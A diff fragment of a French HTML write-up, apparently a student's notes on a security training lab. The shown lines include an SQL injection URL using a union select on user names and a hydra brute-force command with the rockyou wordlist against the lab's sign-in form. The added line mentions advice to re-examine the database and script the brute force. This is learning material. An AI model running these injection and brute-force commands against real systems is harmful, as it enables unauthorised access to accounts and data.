@@ -11,3 +11,4 @@ http://10.13.200.240/?page=member&id=1+or+true+union+select+first_name%2C+last_n
 Je suis donc partie sur les first_name et last_name comme indice pour le username et j'ai tenté de brute force le password sans résultat<br>
 La ligne de commande pour brute force avec hydra ressemble à ça : rm hydra.restore && hydra -l two -P /usr/share/wordlists/rockyou.txt 10.13.200.240 http-get-form "/:?page=signin&username=^USER^&password=^PASS^&Login=:Home"<br>
 </p>
+<p>On nous a conseille de refouiller la DB, et de regarder un "rang" au dessus pour voir TOUTE les bases et de faire un scrip de test pour le brute force</p>
